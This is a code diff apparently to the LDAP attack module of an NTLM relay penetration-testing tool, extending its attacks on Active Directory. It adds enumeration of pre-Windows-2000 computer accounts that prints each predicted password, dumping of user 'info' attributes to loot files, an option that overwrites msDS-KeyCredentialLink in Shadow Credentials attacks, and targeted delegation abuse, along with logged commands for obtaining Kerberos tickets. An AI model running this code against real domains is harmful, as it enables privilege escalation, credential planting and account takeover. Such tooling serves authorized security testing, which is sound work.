@@ -27,6 +27,8 @@ import re
 import dns.resolver
 import ldap3
 import ldapdomaindump
+import csv
+import html
 from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
 from ldap3.protocol.microsoft import security_descriptor_control
 from ldap3.protocol.formatters.formatters import format_sid
@@ -62,6 +64,23 @@ dumpedAdcs = False
 alreadyEscalated = False
 alreadyAddedComputer = False
 delegatePerformed = []
+
+PRE2K_TIMESTAMP_TOLERANCE = datetime.timedelta(seconds=1)
+
+
+def _password_set_at_account_creation(attributes):
+    """Return whether pwdLastSet and whenCreated represent the same second."""
+    pwd_last_set = attributes.get('pwdLastSet')
+    when_created = attributes.get('whenCreated')
+
+    if not isinstance(pwd_last_set, datetime.datetime) or not isinstance(when_created, datetime.datetime):
+        return False
+
+    try:
+        return abs(pwd_last_set - when_created) <= PRE2K_TIMESTAMP_TOLERANCE
+    except TypeError:
+        # Do not compare offset-aware and offset-naive timestamps.
+        return False
 
 #gMSA structure
 class MSDS_MANAGEDPASSWORD_BLOB(Structure):
@@ -251,11 +270,19 @@ class LDAPAttack(ProtocolAttack):
             'member': [(ldap3.MODIFY_ADD, [userDn])]})
         if res:
             LOG.info('Adding user: %s to group %s result: OK' % (userName, groupName))
-            LOG.info('Privilege escalation succesful, shutting down...')
+            LOG.info('Privilege escalation successful, shutting down...')
             alreadyEscalated = True
             _thread.interrupt_main()
         else:
             LOG.error('Failed to add user to %s group: %s' % (groupName, str(self.client.result)))
+
+    def _handleShadowCredentialModifyError(self):
+        if self.client.result['result'] == 50:
+            LOG.error('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
+        elif self.client.result['result'] == 19:
+            LOG.error('Could not modify object, the server reports a constrained violation: %s' % self.client.result['message'])
+        else:
+            LOG.error('The server returned an error: %s' % self.client.result['message'])
 
 
     def shadowCredentialsAttack(self, domainDumper):
@@ -299,8 +326,20 @@ class LDAPAttack(ProtocolAttack):
         if not results:
             LOG.error('Could not query target user properties')
             return
+
         try:
-            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [shadow_credentials.toDNWithBinary2String( keyCredential.dumpBinary(), target_dn )]
+            existing_values = results['raw_attributes'].get('msDS-KeyCredentialLink', [])
+            LOG.info('Found %d existing KeyCredential(s) on target object', len(existing_values))
+            if self.config.ShadowCredentialsReplace:
+                if len(existing_values) > 0:
+                    backup_count, backup_path = shadow_credentials.backupKeyCredentialsToJSON(
+                        currentShadowCredentialsTarget, existing_values, self.config.ShadowCredentialsBackupPath)
+                    LOG.info('Exported %d existing KeyCredential(s) to %s', backup_count, backup_path)
+
+                new_values = [shadow_credentials.toDNWithBinary2String(keyCredential.dumpBinary(), target_dn)]
+            else:
+                new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [shadow_credentials.toDNWithBinary2String( keyCredential.dumpBinary(), target_dn )]
+
             LOG.info("Updating the msDS-KeyCredentialLink attribute of %s" % currentShadowCredentialsTarget)
             self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.client.result['result'] == 0:
@@ -314,9 +353,8 @@ class LDAPAttack(ProtocolAttack):
                     shadow_credentials.exportPEM(certificate,key,path_to_files=path)
                     LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
                     LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
-                    LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     LOG.info("Run the following command to obtain a TGT")
-                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, currentShadowCredentialsTarget, path))
+                    LOG.info("python3 getTGT.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s" % (path, path, domain, currentShadowCredentialsTarget))
                 elif self.config.ShadowCredentialsExportType == "PFX":
                     if self.config.ShadowCredentialsPFXPassword is None:
                         password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
@@ -326,17 +364,11 @@ class LDAPAttack(ProtocolAttack):
                     shadow_credentials.exportPFX(certificate,key,password=password, path_to_file=path)
                     LOG.info("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                     LOG.info("Must be used with password: %s" % password)
-                    LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     LOG.info("Run the following command to obtain a TGT")
-                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, currentShadowCredentialsTarget, path))
+                    LOG.info("python3 getTGT.py -cert-pfx %s.pfx -pfx-pass %s %s/%s" % (path, password, domain, currentShadowCredentialsTarget))
                     delegatePerformed.append(currentShadowCredentialsTarget)
             else:
-                if self.client.result['result'] == 50:
-                    LOG.error('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
-                elif self.client.result['result'] == 19:
-                    LOG.error('Could not modify object, the server reports a constrained violation: %s' % self.client.result['message'])
-                else:
-                    LOG.error('The server returned an error: %s' % self.client.result['message'])
+                self._handleShadowCredentialModifyError()
         except IndexError:
             LOG.info('Attribute msDS-KeyCredentialLink does not exist')
         return
@@ -388,7 +420,7 @@ class LDAPAttack(ProtocolAttack):
         sd['Dacl'].aces.append(create_allow_ace(escalate_sid))
         self.client.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
         if self.client.result['result'] == 0:
-            LOG.info('Delegation rights modified succesfully!')
+            LOG.info('Delegation rights modified successfully!')
             LOG.info('%s can now impersonate users on %s via S4U2Proxy', usersam, targetsam)
             delegatePerformed.append(targetsam)
         else:
@@ -644,6 +676,128 @@ class LDAPAttack(ProtocolAttack):
             return True
         # If none of these match, the ACE does not apply to this object
         return False
+
+    def dumpPre2k(self, domainDumper):
+        """
+        Enumerate computer accounts potentially vulnerable to pre-Windows 2000 authentication.
+        These accounts have a predictable password (lowercase machine name without trailing $).
+        Detection: PASSWD_NOTREQD flag (0x0020) in userAccountControl, or pwdLastSet equals whenCreated
+        (password was never changed since account creation).
+        """
+        LOG.info("Enumerating computer accounts potentially vulnerable to Pre-Windows 2000 authentication")
+
+        # UF_WORKSTATION_TRUST_ACCOUNT = 0x1000 (4096)
+        # UF_PASSWD_NOTREQD = 0x0020 (32)
+        # Search for computer accounts with PASSWD_NOTREQD flag set
+        search_filter = '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=32))'
+        attributes = [
+            'sAMAccountName',
+            'userAccountControl',
+            'pwdLastSet',
+            'whenCreated',
+            'distinguishedName',
+            'operatingSystem',
+        ]
+
+        success = self.client.search(
+            domainDumper.root,
+            search_filter,
+            search_scope=ldap3.SUBTREE,
+            attributes=attributes
+        )
+
+        pre2k_candidates = []
+        existing_sams = set()
+
+        def addPre2kCandidates(detection_reason, confidence, predicate=None):
+            for entry in self.client.response:
+                if entry['type'] != 'searchResEntry':
+                    continue
+                try:
+                    if predicate is not None and not predicate(entry['attributes']):
+                        continue
+                    sam = entry['attributes']['sAMAccountName']
+                    if sam in existing_sams:
+                        continue
+                    uac = entry['attributes']['userAccountControl']
+                    pwd_last_set = entry['attributes']['pwdLastSet']
+                    when_created = entry['attributes']['whenCreated']
+                    dn = entry['attributes']['distinguishedName']
+                    os_name = entry['attributes'].get('operatingSystem') or 'N/A'
+
+                    pre2k_candidates.append({
+                        'sAMAccountName': sam,
+                        'distinguishedName': dn,
+                        'userAccountControl': uac,
+                        'pwdLastSet': str(pwd_last_set),
+                        'whenCreated': str(when_created),
+                        'operatingSystem': os_name,
+                        'predictedPassword': sam.rstrip('$').lower(),
+                        'detectionReason': detection_reason,
+                        'confidence': confidence,
+                    })
+                    existing_sams.add(sam)
+                except (KeyError, IndexError):
+                    continue
+
+        if success:
+            addPre2kCandidates('PASSWD_NOTREQD flag set', 'medium')
+
+        # Also search for computer accounts where password was never changed (pwdLastSet == 0)
+        search_filter2 = '(&(objectCategory=computer)(pwdLastSet=0)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'
+        success2 = self.client.search(
+            domainDumper.root,
+            search_filter2,
+            search_scope=ldap3.SUBTREE,
+            attributes=attributes
+        )
+
+        if success2:
+            addPre2kCandidates('pwdLastSet == 0', 'medium')
+
+        # whenCreated has whole-second precision while pwdLastSet can include fractions of a
+        # second, so compare the values client-side with a small tolerance.
+        search_filter3 = '(&(objectCategory=computer)(pwdLastSet=*)(whenCreated=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'
+        success3 = self.client.search(
+            domainDumper.root,
+            search_filter3,
+            search_scope=ldap3.SUBTREE,
+            attributes=attributes
+        )
+
+        if success3:
+            addPre2kCandidates('pwdLastSet within 1s of whenCreated', 'low', _password_set_at_account_creation)
+
+        if not pre2k_candidates:
+            LOG.info("No Pre-Windows 2000 vulnerable computer accounts found")
+            return
+
+        LOG.info("Found %d potentially vulnerable Pre-Windows 2000 computer account(s):" % len(pre2k_candidates))
+
+        fd = None
+        filename = os.path.join(
+            self.config.lootdir,
+            "pre2k-dump-%s-%d.json" % (self.username, random.randint(0, 99999))
+        )
+
+        for candidate in pre2k_candidates:
+            LOG.info(
+                "  %-30s Password: %-25s Confidence: %-6s Reason: %-40s OS: %s" % (
+                    candidate['sAMAccountName'],
+                    candidate['predictedPassword'],
+                    candidate['confidence'],
+                    candidate['detectionReason'],
+                    candidate['operatingSystem'],
+                )
+            )
+
+        try:
+            fd = open(filename, "w")
+            json.dump(pre2k_candidates, fd, indent=2)
+            fd.close()
+            LOG.info("Pre-Windows 2000 results saved to %s" % filename)
+        except Exception as e:
+            LOG.error("Failed to save Pre-Windows 2000 results: %s" % str(e))
 
     def dumpADCS(self):
 
@@ -1079,10 +1233,75 @@ class LDAPAttack(ProtocolAttack):
                     LOG.info("Successfully dumped %d gMSA passwords through relayed account %s" % (count, self.username))
                     fd.close()
 
+        # Dump user and group domain objects info attributes
+        if self.config.dumpinfoattr:
+            LOG.info("Attempting to dump user info attributes")
+            entries = list(self.client.extend.standard.paged_search(
+                domainDumper.root,
+                '(&(info=*)(|(objectCategory=person)(objectCategory=group)))',
+                attributes=['sAMAccountName', 'memberOf', 'info'],
+                generator=True,
+            ))
+            entries = [e for e in entries
+                       if e.get('type') == 'searchResEntry' and e.get('raw_attributes', {}).get('info') is not None]
+            if not entries:
+                LOG.info("No user info attributes found readable by %s" % self.username)
+            else:
+                os.makedirs(self.config.lootdir, exist_ok=True)
+                stamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
+                base = os.path.join(self.config.lootdir, 'domain_objects_info_' + stamp)
+
+                # .grep - for grepable output with tab delimiter
+                with open(base + '.grep', 'w', encoding='utf-8') as f:
+                    writer = csv.writer(f, delimiter='\t')
+                    writer.writerow(['sAMAccountName', 'memberOf', 'info'])
+                    for e in entries:
+                        sam  = e['attributes']['sAMAccountName'] or ''
+                        dn   = e['attributes']['memberOf'] or ''
+                        info = (e['attributes']['info'] or '').replace('\n', ' ').replace('\r', '')
+                        writer.writerow([sam, dn, info])
+
+                # .json - array of dicts
+                with open(base + '.json', 'w', encoding='utf-8') as f:
+                    out = [{'sAMAccountName': e['attributes']['sAMAccountName'],
+                            'memberOf': e['attributes']['memberOf'],
+                            'info': e['attributes']['info']}
+                           for e in entries]
+                    json.dump(out, f, indent=2, default=str)
+
+                    # .html - table matching ldapdomaindump style
+                    def _he(s):
+                        return html.escape(str(s))
+
+                    with open(base + '.html', 'w', encoding='utf-8') as f:
+                        f.write('<!DOCTYPE html><html><head><meta charset="UTF-8"><style>'
+                                'body{font-family:arial,sans-serif;font-size:12px}'
+                                'table{border-collapse:collapse;width:100%}'
+                                'th,td{border:1px solid #aaa;padding:3px 6px;text-align:left;vertical-align:top}'
+                                'th{background:#336699;color:#fff}'
+                                'tr:nth-child(even){background:#f2f2f2}'
+                                '</style></head><body>\n'
+                                '<table><thead>'
+                                '<tr><td colspan="3"><b>Domain user and group objects - info attribute</b></td></tr>'
+                                '<tr><th>sAMAccountName</th><th>memberOf</th><th>info</th></tr>'
+                                '</thead><tbody>\n')
+                        for e in entries:
+                            f.write('<tr><td>%s</td><td>%s</td><td>%s</td></tr>\n' % (
+                                _he(e['attributes']['sAMAccountName']),
+                                _he(e['attributes']['memberOf']),
+                                _he(e['attributes']['info'])))
+                        f.write('</tbody></table></body></html>\n')
+
+                LOG.info("Dumped info attribute for %d domain object(s) to %s.{grep,json,html}" % (len(entries), base))
+
         if not dumpedAdcs and self.config.dumpadcs:
             dumpedAdcs = True
             self.dumpADCS()
             LOG.info("Done dumping ADCS info")
+
+        # Dump Pre-Windows 2000 vulnerable computer accounts
+        if self.config.dumppre2k:
+            self.dumpPre2k(domainDumper)
 
         if self.config.adddnsrecord:
             name = self.config.adddnsrecord[0]
@@ -1118,9 +1337,10 @@ class LDAPAttack(ProtocolAttack):
             LOG.debug("Computer container is {}".format(computerscontainer))
             self.addComputer(computerscontainer, domainDumper)
 
-        # Perform the Delegate attack if it is enabled and we relayed a computer account
-        if self.config.delegateaccess and self.username[-1] == '$':
-            self.delegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)
+        # Perform the Delegate attack on --delegate-target, or on the relayed computer account by default
+        if self.config.delegateaccess and (self.config.delegatetarget or self.username[-1] == '$'):
+            targetsam = self.config.delegatetarget if self.config.delegatetarget else self.username
+            self.delegateAttack(self.config.escalateuser, targetsam, domainDumper, self.config.sid)
             return
         
         # Perform the Shadow Credentials attack if it is enabled
